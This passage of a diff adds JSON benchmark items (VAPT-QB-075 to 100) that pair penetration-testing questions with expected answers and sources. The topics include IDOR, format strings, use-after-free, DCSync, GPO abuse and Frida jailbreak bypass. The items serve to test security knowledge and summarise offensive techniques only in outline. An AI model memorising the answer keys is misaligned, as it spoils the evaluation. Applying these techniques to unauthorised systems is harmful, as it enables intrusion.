+    "category": "code_analysis",
+    "expected_sources": [
+      "Spring Security Reference",
+      "CWE-285"
+    ],
+    "expected_claims": [
+      "Discrepancies between reverse proxy, security filter, and servlet routing cause filters to skip authorization checks"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-075",
+    "question": "Why do GraphQL APIs frequently suffer from object authorization flaws at the individual field resolver level?",
+    "domain": "AUTHORIZATION",
+    "subdomain": "GRAPHQL_FIELD_AUTH",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "GraphQL Authorization",
+      "Field Resolver",
+      "Object-Level Authorization",
+      "Nested queries"
+    ],
+    "expected_answer_characteristics": [
+      "Authorizing top-level query does not enforce permissions when resolving related nested object fields"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP GraphQL Cheat Sheet",
+      "CWE-639"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "OWASP GraphQL Cheat Sheet",
+      "CWE-639"
+    ],
+    "expected_claims": [
+      "Authorizing top-level query does not enforce permissions when resolving related nested object fields"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-076",
+    "question": "Does replacing sequential integer IDs with UUIDv4 eliminate Insecure Direct Object References (IDOR)?",
+    "domain": "AUTHORIZATION",
+    "subdomain": "IDOR_NUMERIC_UUID",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "IDOR",
+      "UUIDv4",
+      "Access Control vs Obscurity",
+      "Identifier Guessability"
+    ],
+    "expected_answer_characteristics": [
+      "UUIDs prevent sequential guessing but do NOT enforce authorization checks",
+      "If user B accesses user A's UUID without authorization validation, the IDOR vulnerability remains"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP WSTG-ATHZ-04",
+      "CWE-639"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "OWASP WSTG-ATHZ-04",
+      "CWE-639"
+    ],
+    "expected_claims": [
+      "UUIDs prevent sequential guessing but do NOT enforce authorization checks",
+      "If user B accesses user A's UUID without authorization validation, the IDOR vulnerability remains"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-077",
+    "question": "How does the Android Keystore system protect cryptographic keys against extraction even on rooted devices?",
+    "domain": "MOBILE",
+    "subdomain": "ANDROID_KEYSTORE",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Android Keystore",
+      "TEE",
+      "StrongBox",
+      "Hardware Security Module",
+      "Keymaster"
+    ],
+    "expected_answer_characteristics": [
+      "Keys generated inside Keystore reside in hardware-backed TEE or StrongBox and never enter application memory space"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Android Developer Keystore Guide",
+      "OWASP MASTG-CRYPTO-1"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "Android Developer Keystore Guide",
+      "OWASP MASTG-CRYPTO-1"
+    ],
+    "expected_claims": [
+      "Keys generated inside Keystore reside in hardware-backed TEE or StrongBox and never enter application memory space"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-078",
+    "question": "What is the procedure for decompiling an APK to Smali, modifying bytecode instructions, and repacking/re-signing for testing?",
+    "domain": "MOBILE",
+    "subdomain": "SMALI_REVERSING",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Apktool",
+      "Smali",
+      "Bytecode patching",
+      "zipalign",
+      "apksigner",
+      "Android reversing"
+    ],
+    "expected_answer_characteristics": [
+      "Disassemble with Apktool, modify Smali opcodes, rebuild APK, align with zipalign, and sign with test key"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP MASTG-REVERSE-1",
+      "Apktool Documentation"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "OWASP MASTG-REVERSE-1",
+      "Apktool Documentation"
+    ],
+    "expected_claims": [
+      "Disassemble with Apktool, modify Smali opcodes, rebuild APK, align with zipalign, and sign with test key"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-079",
+    "question": "What file path checks and sandbox escape indicators are typically used in iOS jailbreak detection, and how does Frida bypass them?",
+    "domain": "MOBILE",
+    "subdomain": "IOS_JAILBREAK_DETECTION",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "iOS Jailbreak",
+      "Frida Hooking",
+      "/Applications/Cydia.app",
+      "fork() check",
+      "Stat hook"
+    ],
+    "expected_answer_characteristics": [
+      "Apps inspect standard jailbreak paths and sandbox permissions; Frida hooks file APIs to return file-not-found"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP MASTG-RESILIENCE-1"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "OWASP MASTG-RESILIENCE-1"
+    ],
+    "expected_claims": [
+      "Apps inspect standard jailbreak paths and sandbox permissions; Frida hooks file APIs to return file-not-found"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-080",
+    "question": "Explain the mechanics of a Use-After-Free (UAF) vulnerability in C/C++ memory allocation.",
+    "domain": "BINARY_RE",
+    "subdomain": "USE_AFTER_FREE",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "Use-After-Free",
+      "Heap exploitation",
+      "malloc",
+      "free",
+      "Dangling Pointer",
+      "Virtual Method Table"
+    ],
+    "expected_answer_characteristics": [
+      "Program references pointer to memory chunk after it was deallocated",
+      "Reallocating chunk with attacker-controlled data allows hijacking control flow via function pointers"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "CWE-416",
+      "Phrack Magazine"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "CWE-416",
+      "Phrack Magazine"
+    ],
+    "expected_claims": [
+      "Program references pointer to memory chunk after it was deallocated",
+      "Reallocating chunk with attacker-controlled data allows hijacking control flow via function pointers"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-081",
+    "question": "How do integer overflows in memory allocation size calculations lead to subsequent heap buffer overflows?",
+    "domain": "BINARY_RE",
+    "subdomain": "INTEGER_OVERFLOW",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Integer Overflow",
+      "Integer Wraparound",
+      "calloc/malloc",
+      "Heap Buffer Overflow",
+      "CWE-190"
+    ],
+    "expected_answer_characteristics": [
+      "Multiplication overflow wraps integer to small value, allocating undersized buffer",
+      "Copying full number of elements overflows allocated heap chunk"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "CWE-190",
+      "CWE-122"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "code_analysis",
+    "expected_sources": [
+      "CWE-190",
+      "CWE-122"
+    ],
+    "expected_claims": [
+      "Multiplication overflow wraps integer to small value, allocating undersized buffer",
+      "Copying full number of elements overflows allocated heap chunk"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-082",
+    "question": "Explain format string vulnerabilities in printf-family functions and how the %n specifier writes to memory.",
+    "domain": "BINARY_RE",
+    "subdomain": "FORMAT_STRING",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "Format String",
+      "printf",
+      "%x",
+      "%s",
+      "%n",
+      "Arbitrary Memory Write",
+      "CWE-134"
+    ],
+    "expected_answer_characteristics": [
+      "Passing user input as format string parses stack values as specifiers",
+      "%n writes count of printed characters to memory address pointed to by stack argument"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "CWE-134",
+      "Scut: Exploiting Format String Vulnerabilities"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "CWE-134",
+      "Scut: Exploiting Format String Vulnerabilities"
+    ],
+    "expected_claims": [
+      "Passing user input as format string parses stack values as specifiers",
+      "%n writes count of printed characters to memory address pointed to by stack argument"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-083",
+    "question": "Describe the PE format structure on Windows, focusing on DOS Header, NT Headers, and Import/Export Address Tables (IAT/EAT).",
+    "domain": "BINARY_RE",
+    "subdomain": "PE_PORTABLE_EXECUTABLE",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "PE Format",
+      "IMAGE_DOS_HEADER",
+      "IMAGE_NT_HEADERS",
+      "IAT",
+      "EAT",
+      "Import Directory"
+    ],
+    "expected_answer_characteristics": [
+      "PE files use relative virtual addresses (RVA); IAT resolves dynamic function pointers loaded from Windows DLLs"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Microsoft PE and COFF Specification",
+      "Practical Malware Analysis"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "Microsoft PE and COFF Specification",
+      "Practical Malware Analysis"
+    ],
+    "expected_claims": [
+      "PE files use relative virtual addresses (RVA); IAT resolves dynamic function pointers loaded from Windows DLLs"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-084",
+    "question": "What is symbolic execution in automated vulnerability research and what is the path explosion problem?",
+    "domain": "BINARY_RE",
+    "subdomain": "SYMBOLIC_EXECUTION",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "Symbolic Execution",
+      "SMT Solvers",
+      "Z3",
+      "Path Explosion",
+      "Concolic Testing"
+    ],
+    "expected_answer_characteristics": [
+      "Evaluates program inputs as algebraic symbols building constraints for constraint solvers",
+      "Branching exponential increase in execution states leads to path explosion"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "James C. King: Symbolic Execution and Program Testing",
+      "Angr Framework"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "James C. King: Symbolic Execution and Program Testing",
+      "Angr Framework"
+    ],
+    "expected_claims": [
+      "Evaluates program inputs as algebraic symbols building constraints for constraint solvers",
+      "Branching exponential increase in execution states leads to path explosion"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-085",
+    "question": "How do Azure Managed Identities function and what risk arises from exposing the local identity token endpoint?",
+    "domain": "CLOUD",
+    "subdomain": "AZURE_MANAGED_IDENTITY",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Azure Managed Identity",
+      "MSI Endpoint",
+      "169.254.169.254",
+      "Azure AD Token",
+      "OAuth Bearer"
+    ],
+    "expected_answer_characteristics": [
+      "Managed identities grant VMs access to Azure AD tokens via local metadata endpoint",
+      "SSRF can capture Azure Resource Manager management tokens"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Microsoft Azure Architecture Documentation"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "Microsoft Azure Architecture Documentation"
+    ],
+    "expected_claims": [
+      "Managed identities grant VMs access to Azure AD tokens via local metadata endpoint",
+      "SSRF can capture Azure Resource Manager management tokens"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-086",
+    "question": "What AWS S3 configurations (Bucket Policies, Block Public Access, ACLs) are necessary to prevent public exposure of sensitive assets?",
+    "domain": "CLOUD",
+    "subdomain": "S3_BUCKET_SECURITY",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "AWS S3",
+      "S3 Block Public Access",
+      "Bucket Policy",
+      "S3 ACL",
+      "Public Read Misconfiguration"
+    ],
+    "expected_answer_characteristics": [
+      "Enable S3 Block Public Access at account and bucket level to override legacy permissive ACLs"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "AWS S3 Security Best Practices Guide",
+      "CIS AWS Foundations Benchmark"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "defensive_mitigation",
+    "expected_sources": [
+      "AWS S3 Security Best Practices Guide",
+      "CIS AWS Foundations Benchmark"
+    ],
+    "expected_claims": [
+      "Enable S3 Block Public Access at account and bucket level to override legacy permissive ACLs"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-087",
+    "question": "How does BloodHound use graph theory to uncover hidden privilege escalation paths in Active Directory environments?",
+    "domain": "WINDOWS_AD",
+    "subdomain": "BLOODHOUND_ATTACK_PATHS",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "BloodHound",
+      "Active Directory Graph",
+      "Neo4j",
+      "GenericAll",
+      "WriteDacl",
+      "Group Delegations"
+    ],
+    "expected_answer_characteristics": [
+      "Maps users, groups, computers, and ACL permissions as nodes and edges to compute shortest path to Domain Admins"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "BloodHound Documentation",
+      "SpecterOps Research"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "BloodHound Documentation",
+      "SpecterOps Research"
+    ],
+    "expected_claims": [
+      "Maps users, groups, computers, and ACL permissions as nodes and edges to compute shortest path to Domain Admins"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-088",
+    "question": "How can an attacker escalate privileges if they have Write permissions over a Group Policy Object (GPO)?",
+    "domain": "WINDOWS_AD",
+    "subdomain": "GPO_ABUSE",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "Group Policy",
+      "GPO Abuse",
+      "Immediate Task",
+      "Domain Privilege Escalation",
+      "gpupdate"
+    ],
+    "expected_answer_characteristics": [
+      "Modifying GPO to deploy scheduled task or local administrator rights propagates to all linked computers via gpupdate"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "MITRE ATT&CK T1484.001",
+      "Microsoft Group Policy Documentation"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "attack_chain_reasoning",
+    "expected_sources": [
+      "MITRE ATT&CK T1484.001",
+      "Microsoft Group Policy Documentation"
+    ],
+    "expected_claims": [
+      "Modifying GPO to deploy scheduled task or local administrator rights propagates to all linked computers via gpupdate"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-089",
+    "question": "What directory replication permissions (DS-Replication-Get-Changes) enable a DCSync attack to extract Active Directory password hashes?",
+    "domain": "WINDOWS_AD",
+    "subdomain": "DCSYNC",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "DCSync",
+      "DRSUAPI",
+      "Replication Permissions",
+      "krbtgt",
+      "Mimikatz",
+      "Active Directory"
+    ],
+    "expected_answer_characteristics": [
+      "Accounts with replication rights simulate a Domain Controller to request password hashes via DRSUAPI RPC"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "MITRE ATT&CK T1003.006",
+      "Microsoft MS-DRSR Documentation"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "MITRE ATT&CK T1003.006",
+      "Microsoft MS-DRSR Documentation"
+    ],
+    "expected_claims": [
+      "Accounts with replication rights simulate a Domain Controller to request password hashes via DRSUAPI RPC"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-090",
+    "question": "Explain CVE-2021-42278 and CVE-2021-42287 (sAMAccountName spoofing) that allowed domain computer accounts to escalate to Domain Admin.",
+    "domain": "WINDOWS_AD",
+    "subdomain": "SAMACCOUNTNAME_SPOOFING",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "CVE-2021-42278",
+      "CVE-2021-42287",
+      "sAMAccountName",
+      "Kerberos PAC",
+      "Active Directory Privilege Escalation"
+    ],
+    "expected_answer_characteristics": [
+      "Renaming computer account to match Domain Controller without trailing dollar sign and requesting TGS yielded DC-level PAC ticket"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Microsoft Security Advisory",
+      "NVD CVE-2021-42278"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "cve_analysis",
+    "expected_sources": [
+      "Microsoft Security Advisory",
+      "NVD CVE-2021-42278"
+    ],
+    "expected_claims": [
+      "Renaming computer account to match Domain Controller without trailing dollar sign and requesting TGS yielded DC-level PAC ticket"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-091",
+    "question": "What security considerations apply to serverless functions (AWS Lambda) regarding execution context reuse and /tmp persistence?",
+    "domain": "CLOUD",
+    "subdomain": "SERVERLESS_SECURITY",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Serverless",
+      "AWS Lambda",
+      "Execution Context",
+      "Warm Start",
+      "/tmp directory persistence"
+    ],
+    "expected_answer_characteristics": [
+      "Subsequent invocations of warm container retain state in memory and files written to /tmp across user boundaries"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "AWS Lambda Security Overview",
+      "OWASP Serverless Top 10"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "AWS Lambda Security Overview",
+      "OWASP Serverless Top 10"
+    ],
+    "expected_claims": [
+      "Subsequent invocations of warm container retain state in memory and files written to /tmp across user boundaries"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-092",
+    "question": "Why is mounting the host /var/run/docker.sock into a container equivalent to giving the container root access to the host?",
+    "domain": "CLOUD",
+    "subdomain": "DOCKER_SOCKET_MOUNT",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "Docker Socket",
+      "/var/run/docker.sock",
+      "Container Breakout",
+      "Daemon API",
+      "Root Privileges"
+    ],
+    "expected_answer_characteristics": [
+      "Direct access to Docker daemon API allows creating new privileged containers with root host filesystem mounts"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Docker Daemon Documentation",
+      "CWE-250"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "Docker Daemon Documentation",
+      "CWE-250"
+    ],
+    "expected_claims": [
+      "Direct access to Docker daemon API allows creating new privileged containers with root host filesystem mounts"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-093",
+    "question": "Why do prepared statements and parameterized queries fundamentally prevent SQL injection while string sanitization frequently fails?",
+    "domain": "SECURE_CODING",
+    "subdomain": "PARAMETRIZED_QUERIES",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "Parameterized Queries",
+      "Prepared Statements",
+      "AST Parsing",
+      "SQLi Prevention",
+      "Separation of Code and Data"
+    ],
+    "expected_answer_characteristics": [
+      "Prepared statements compile SQL command structure before binding parameters as literals, preventing payload interpretation as code"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP SQL Injection Prevention Cheat Sheet",
+      "CWE-89"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "defensive_mitigation",
+    "expected_sources": [
+      "OWASP SQL Injection Prevention Cheat Sheet",
+      "CWE-89"
+    ],
+    "expected_claims": [
+      "Prepared statements compile SQL command structure before binding parameters as literals, preventing payload interpretation as code"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-094",
+    "question": "How does Rust's ownership and borrow checker guarantee memory safety without relying on a garbage collector?",
+    "domain": "SECURE_CODING",
+    "subdomain": "MEMORY_SAFE_LANGUAGES",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Rust",
+      "Borrow Checker",
+      "Ownership",
+      "Lifetimes",
+      "Memory Safety",
+      "Use-After-Free Elimination"
+    ],
+    "expected_answer_characteristics": [
+      "Enforces strict compile-time rules ensuring one mutable reference or multiple immutable references, eliminating UAF and data races"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Rust Language Documentation",
+      "NSA Cybersecurity Information Sheet"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "comparison",
+    "expected_sources": [
+      "Rust Language Documentation",
+      "NSA Cybersecurity Information Sheet"
+    ],
+    "expected_claims": [
+      "Enforces strict compile-time rules ensuring one mutable reference or multiple immutable references, eliminating UAF and data races"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-095",
+    "question": "What is a Kerberos Golden Ticket and how does resetting the krbtgt account password twice remediate it?",
+    "domain": "SOC_DFIR",
+    "subdomain": "KERBEROS_GOLDEN_TICKET",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "Golden Ticket",
+      "krbtgt",
+      "Active Directory Remediation",
+      "Kerberos TGT",
+      "MITRE ATT&CK T1558.001"
+    ],
+    "expected_answer_characteristics": [
+      "Forging TGT using compromised krbtgt key grants arbitrary domain access; double password reset invalidates old and current keys"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Microsoft Active Directory Forest Recovery Guide",
+      "MITRE ATT&CK"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "Microsoft Active Directory Forest Recovery Guide",
+      "MITRE ATT&CK"
+    ],
+    "expected_claims": [
+      "Forging TGT using compromised krbtgt key grants arbitrary domain access; double password reset invalidates old and current keys"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-096",
+    "question": "What volatile artifacts are analyzed during memory forensics with Volatility to detect code injection and hidden processes?",
+    "domain": "SOC_DFIR",
+    "subdomain": "MEMORY_FORENSICS",
+    "difficulty": "ADVANCED",
+    "expected_topics": [
+      "Memory Forensics",
+      "Volatility",
+      "pslist vs psscan",
+      "malfind",
+      "VAD tree",
+      "Injected DLLs"
+    ],
+    "expected_answer_characteristics": [
+      "malfind identifies memory segments with PAGE_EXECUTE_READWRITE permissions; psscan uncovers unlinked hidden processes"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Volatility Foundation Guide",
+      "SANS FOR508"
+    ],
+    "requires_deep_reasoning": true,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "Volatility Foundation Guide",
+      "SANS FOR508"
+    ],
+    "expected_claims": [
+      "malfind identifies memory segments with PAGE_EXECUTE_READWRITE permissions; psscan uncovers unlinked hidden processes"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-097",
+    "question": "Why is strict deterministic ScopeGate enforcement mandatory before executing automated security testing tools in enterprise environments?",
+    "domain": "VAPT_METHODOLOGY",
+    "subdomain": "SCOPE_ENFORCEMENT",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "ScopeGate",
+      "Rules of Engagement",
+      "Out-of-Scope Targets",
+      "Authorization Boundaries",
+      "Legal Safe Harbor"
+    ],
+    "expected_answer_characteristics": [
+      "Prevents illegal testing against third-party shared infrastructure and ensures actions remain within authorized scope"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "OWASP WSTG",
+      "NIST SP 800-115",
+      "Platform Invariants"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "OWASP WSTG",
+      "NIST SP 800-115",
+      "Platform Invariants"
+    ],
+    "expected_claims": [
+      "Prevents illegal testing against third-party shared infrastructure and ensures actions remain within authorized scope"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-098",
+    "question": "How do HTTP proxy extensions (such as Burp Suite Montoya API or Python proxy scripts) automate request tampering during manual penetration tests?",
+    "domain": "VAPT_METHODOLOGY",
+    "subdomain": "BURP_SUITE_EXTENSIONS",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "HTTP Proxy",
+      "Burp Suite",
+      "Montoya API",
+      "Request Interception",
+      "Passive Analysis"
+    ],
+    "expected_answer_characteristics": [
+      "Inspects and programmatically modifies HTTP headers and request bodies on the fly between browser and server"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "PortSwigger Montoya API Documentation"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "PortSwigger Montoya API Documentation"
+    ],
+    "expected_claims": [
+      "Inspects and programmatically modifies HTTP headers and request bodies on the fly between browser and server"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-099",
+    "question": "Explain Microsoft's STRIDE threat modeling methodology and how each element maps to a core security property.",
+    "domain": "VAPT_METHODOLOGY",
+    "subdomain": "THREAT_MODELING_STRIDE",
+    "difficulty": "BEGINNER",
+    "expected_topics": [
+      "STRIDE",
+      "Threat Modeling",
+      "Spoofing",
+      "Tampering",
+      "Repudiation",
+      "Information Disclosure",
+      "DoS",
+      "Elevation of Privilege"
+    ],
+    "expected_answer_characteristics": [
+      "STRIDE maps directly to violations of Authenticity, Integrity, Non-repudiation, Confidentiality, Availability, and Authorization"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Microsoft Threat Modeling Guide",
+      "OWASP Threat Modeling Cheat Sheet"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "conceptual",
+    "expected_sources": [
+      "Microsoft Threat Modeling Guide",
+      "OWASP Threat Modeling Cheat Sheet"
+    ],
+    "expected_claims": [
+      "STRIDE maps directly to violations of Authenticity, Integrity, Non-repudiation, Confidentiality, Availability, and Authorization"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  },
+  {
+    "query_id": "VAPT-QB-100",
+    "question": "Why is cryptographic evidence lineage required to validate that an AI model hypothesis is grounded in actual target observations?",
+    "domain": "VAPT_METHODOLOGY",
+    "subdomain": "EVIDENCE_LINEAGE",
+    "difficulty": "INTERMEDIATE",
+    "expected_topics": [
+      "Evidence Lineage",
+      "FACT vs HYPOTHESIS",
+      "Cryptographic Provenance",
+      "SHA-256 Chain",
+      "Epistemic Boundaries"
+    ],
+    "expected_answer_characteristics": [
+      "Cryptographic SHA-256 lineage traces every claim to a verified observation, preventing model hallucination promotion"
+    ],
+    "citation_required": true,
+    "expected_source_classes": [
+      "Milestone M8 Platform Security Invariants",
+      "NIST AI Risk Management Framework"
+    ],
+    "requires_deep_reasoning": false,
+    "expected_epistemic_status": "GENERAL_VAPT_KNOWLEDGE",
+    "category": "methodological",
+    "expected_sources": [
+      "Milestone M8 Platform Security Invariants",
+      "NIST AI Risk Management Framework"
+    ],
+    "expected_claims": [
+      "Cryptographic SHA-256 lineage traces every claim to a verified observation, preventing model hallucination promotion"
+    ],
+    "expected_epistemic_type": "GENERAL_VAPT_KNOWLEDGE",
+    "requires_external_research": false
+  }
+]
